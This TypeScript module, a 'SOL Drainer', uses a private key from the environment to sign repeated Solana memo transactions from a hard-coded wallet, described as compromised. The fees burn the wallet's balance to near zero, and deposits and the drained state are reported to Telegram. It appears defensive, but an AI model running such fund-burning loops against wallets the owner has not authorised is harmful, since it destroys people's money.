import { PublicKey, Keypair, Transaction, TransactionInstruction, ComputeBudgetProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';
import bs58 from 'bs58';

const SOURCE_WALLET = 'FPHrLbLET7CuKERMJzYPum6ucKMpityhKfAGZBBHHATX';
const DESTINATION_WALLET = '6WzQ6yKYmzzXg8Kdo3o7mmPzjYvU9fqHKJRS3zu85xpW';

const LOOP_INTERVAL_MS = 1500;
const MIN_BALANCE_TO_BURN = 6_000;

const MEMO_PROGRAM_ID = new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');

const RPC_ENDPOINTS = [
  'https://api.mainnet-beta.solana.com',
  'https://solana-rpc.publicnode.com',
];

let currentRpcIndex = 0;
let drainInterval: NodeJS.Timeout | null = null;
let isRunning = false;
let lastDrainTime: string | null = null;
let totalFeeBurned = 0;
let burnCount = 0;
let successCount = 0;
let failCount = 0;
let consecutiveErrors = 0;
let isDraining = false;
let incomingDetected = 0;
let lastKnownBalance = 0;
let walletEmptySince: string | null = null;
let loopCount = 0;
let lastBalanceCheck = 0;
let lastSendError = '';
let sendErrorCount = 0;
let cachedBlockhash: string | null = null;
let cachedBlockhashTime = 0;
let lastValidBlockHeight = 0;

async function rawRpcCall(endpoint: string, method: string, params: any[]): Promise<any> {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 5000);
  try {
    const resp = await fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
      signal: controller.signal,
    });
    clearTimeout(timeout);
    if (!resp.ok) {
      const text = await resp.text().catch(() => '');
      throw new Error(`${resp.status}: ${text.slice(0, 100)}`);
    }
    const json = await resp.json();
    if (json.error) throw new Error(json.error.message || JSON.stringify(json.error));
    return json.result;
  } catch (err: any) {
    clearTimeout(timeout);
    throw err;
  }
}

async function getBalance(pubkey: string): Promise<number> {
  const endpoint = RPC_ENDPOINTS[currentRpcIndex];
  const result = await rawRpcCall(endpoint, 'getBalance', [pubkey, { commitment: 'confirmed' }]);
  return result?.value ?? 0;
}

async function getBlockhash(): Promise<{ blockhash: string; lastValidBlockHeight: number }> {
  const now = Date.now();
  if (cachedBlockhash && now - cachedBlockhashTime < 10_000) {
    return { blockhash: cachedBlockhash, lastValidBlockHeight };
  }
  const endpoint = RPC_ENDPOINTS[currentRpcIndex];
  const result = await rawRpcCall(endpoint, 'getLatestBlockhash', [{ commitment: 'confirmed' }]);
  cachedBlockhash = result.value.blockhash;
  cachedBlockhashTime = now;
  lastValidBlockHeight = result.value.lastValidBlockHeight;
  return { blockhash: cachedBlockhash!, lastValidBlockHeight };
}

async function sendRawTx(rawTx: Buffer, endpoint: string): Promise<string | null> {
  try {
    const b64 = rawTx.toString('base64');
    const result = await rawRpcCall(endpoint, 'sendTransaction', [
      b64,
      { encoding: 'base64', skipPreflight: true, maxRetries: 0 },
    ]);
    return result as string;
  } catch (err: any) {
    sendErrorCount++;
    const msg = err?.message?.slice(0, 120) || 'unknown';
    if (msg !== lastSendError || sendErrorCount % 20 === 0) {
      lastSendError = msg;
      console.log(`[SOL Drainer] Send error (${sendErrorCount}): ${msg}`);
    }
    return null;
  }
}

function getKeypair(): Keypair | null {
  const pk = process.env.JUP_SOURCE_PRIVATE_KEY;
  if (!pk) return null;
  try {
    return Keypair.fromSecretKey(bs58.decode(pk));
  } catch {
    return null;
  }
}

async function sendTelegram(text: string) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
    });
  } catch {}
}

function rotateRpc() {
  currentRpcIndex = (currentRpcIndex + 1) % RPC_ENDPOINTS.length;
}

async function drainLoop() {
  if (!isRunning || isDraining) return;
  isDraining = true;
  loopCount++;

  try {
    const keypair = getKeypair();
    if (!keypair) return;

    const sourcePubkey = new PublicKey(SOURCE_WALLET);

    const now = Date.now();
    if (now - lastBalanceCheck > 5_000 || lastKnownBalance === 0) {
      lastBalanceCheck = now;
      try {
        const balance = await getBalance(SOURCE_WALLET);

        if (lastKnownBalance > 0 && balance > lastKnownBalance + 5_000) {
          const incoming = balance - lastKnownBalance;
          incomingDetected++;
          console.log(`[SOL Drainer] Incoming SOL detected: +${(incoming / LAMPORTS_PER_SOL).toFixed(6)} SOL`);
          walletEmptySince = null;
          await sendTelegram(
            `<b>SOL Drainer - Incoming Detected</b>\n` +
            `Someone sent <b>${(incoming / LAMPORTS_PER_SOL).toFixed(6)} SOL</b> to compromised wallet\n` +
            `Burning it through memo transaction fees...`
          );
        }

        if (loopCount % 30 === 0 || lastKnownBalance === 0) {
          console.log(`[SOL Drainer] Balance: ${(balance / LAMPORTS_PER_SOL).toFixed(6)} SOL (${balance} lamports) | Sent: ${successCount} ok, ${failCount} fail | Burned: ~${(totalFeeBurned / LAMPORTS_PER_SOL).toFixed(6)} SOL`);
        }

        lastKnownBalance = balance;

        if (balance < MIN_BALANCE_TO_BURN) {
          if (!walletEmptySince) {
            walletEmptySince = new Date().toISOString();
            console.log(`[SOL Drainer] DRAINED! Balance: ${balance} lamports`);
            await sendTelegram(
              `<b>SOL Drainer - Wallet Drained!</b>\n` +
              `Balance: <b>${balance} lamports</b>\n` +
              `Total burned: ${(totalFeeBurned / LAMPORTS_PER_SOL).toFixed(6)} SOL in ${successCount} txs`
            );
          }
          return;
        }
        walletEmptySince = null;
      } catch {
        rotateRpc();
        return;
      }
    }

    if (lastKnownBalance < MIN_BALANCE_TO_BURN) return;

    let bh: { blockhash: string; lastValidBlockHeight: number };
    try {
      bh = await getBlockhash();
    } catch {
      rotateRpc();
      cachedBlockhash = null;
      return;
    }

    const tx = new Transaction();
    tx.recentBlockhash = bh.blockhash;
    tx.lastValidBlockHeight = bh.lastValidBlockHeight;
    tx.feePayer = sourcePubkey;

    tx.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }));
    tx.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 200 }));
    tx.add(
      new TransactionInstruction({
        keys: [{ pubkey: sourcePubkey, isSigner: true, isWritable: true }],
        programId: MEMO_PROGRAM_ID,
        data: Buffer.from(`d${Date.now()}-${loopCount}`),
      })
    );

    tx.sign(keypair);
    const rawTx = Buffer.from(tx.serialize());

    const endpoint = RPC_ENDPOINTS[loopCount % RPC_ENDPOINTS.length];
    const sig = await sendRawTx(rawTx, endpoint);

    if (sig) {
      successCount++;
      totalFeeBurned += 5_000;
      lastDrainTime = new Date().toISOString();
      consecutiveErrors = 0;
      burnCount++;
    } else {
      failCount++;
      consecutiveErrors++;
      if (consecutiveErrors % 3 === 0) rotateRpc();
    }
  } catch (error: any) {
    failCount++;
    consecutiveErrors++;
    if (consecutiveErrors <= 3 || consecutiveErrors % 20 === 0) {
      console.log(`[SOL Drainer] Error: ${error?.message?.slice(0, 120)}`);
    }
  } finally {
    isDraining = false;
  }
}

export function startSolDrainer() {
  if (isRunning) return;
  isRunning = true;
  console.log(`[SOL Drainer] Started - RAW FETCH MODE`);
  console.log(`[SOL Drainer] 1 tx every ${LOOP_INTERVAL_MS}ms, alternating ${RPC_ENDPOINTS.length} RPCs`);
  console.log(`[SOL Drainer] Target: ${SOURCE_WALLET}`);
  drainInterval = setInterval(drainLoop, LOOP_INTERVAL_MS);
  drainLoop();
}

export function stopSolDrainer() {
  isRunning = false;
  if (drainInterval) {
    clearInterval(drainInterval);
    drainInterval = null;
  }
  console.log('[SOL Drainer] Stopped');
}

export function getSolDrainerStatus() {
  return {
    running: isRunning,
    mode: 'raw_fetch_memo_burn',
    sourceWallet: SOURCE_WALLET,
    loopIntervalMs: LOOP_INTERVAL_MS,
    totalFeeBurnedLamports: totalFeeBurned,
    totalFeeBurnedSol: totalFeeBurned / LAMPORTS_PER_SOL,
    successCount,
    failCount,
    burnCount,
    loopCount,
    incomingDetected,
    lastKnownBalanceLamports: lastKnownBalance,
    lastKnownBalanceSol: lastKnownBalance / LAMPORTS_PER_SOL,
    walletEmptySince,
    lastDrainTime,
    consecutiveErrors,
    rpcEndpoint: RPC_ENDPOINTS[currentRpcIndex],
    estimatedBurnsRemaining: lastKnownBalance > 0 ? Math.floor(lastKnownBalance / 5_000) : 0,
  };
}

export async function triggerSolDrain() {
  try {
    const keypair = getKeypair();
    if (!keypair) return { success: false, error: 'No private key configured' };

    const sourcePubkey = new PublicKey(SOURCE_WALLET);
    const balance = await getBalance(SOURCE_WALLET);

    if (balance < MIN_BALANCE_TO_BURN) {
      return { success: false, message: 'Balance too low', balanceLamports: balance, balanceSol: balance / LAMPORTS_PER_SOL };
    }

    cachedBlockhash = null;
    const bh = await getBlockhash();

    const sigs: string[] = [];
    for (let i = 0; i < 5; i++) {
      const tx = new Transaction();
      tx.recentBlockhash = bh.blockhash;
      tx.lastValidBlockHeight = bh.lastValidBlockHeight;
      tx.feePayer = sourcePubkey;
      tx.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }));
      tx.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 200 }));
      tx.add(
        new TransactionInstruction({
          keys: [{ pubkey: sourcePubkey, isSigner: true, isWritable: true }],
          programId: MEMO_PROGRAM_ID,
          data: Buffer.from(`manual-${Date.now()}-${i}`),
        })
      );
      tx.sign(keypair);
      const rawTx = Buffer.from(tx.serialize());
      const endpoint = RPC_ENDPOINTS[i % RPC_ENDPOINTS.length];
      const sig = await sendRawTx(rawTx, endpoint);
      if (sig && !sigs.includes(sig)) sigs.push(sig);
      await new Promise(r => setTimeout(r, 200));
    }

    successCount += sigs.length;
    totalFeeBurned += sigs.length * 5_000;
    burnCount += sigs.length;

    return {
      success: true,
      mode: 'raw_fetch_memo_burn',
      sentCount: sigs.length,
      estimatedFeeBurned: sigs.length * 5_000,
      balanceBefore: balance,
      estimatedBalanceAfter: balance - (sigs.length * 5_000),
    };
  } catch (error: any) {
    return { success: false, error: error?.message?.slice(0, 200) };
  }
}
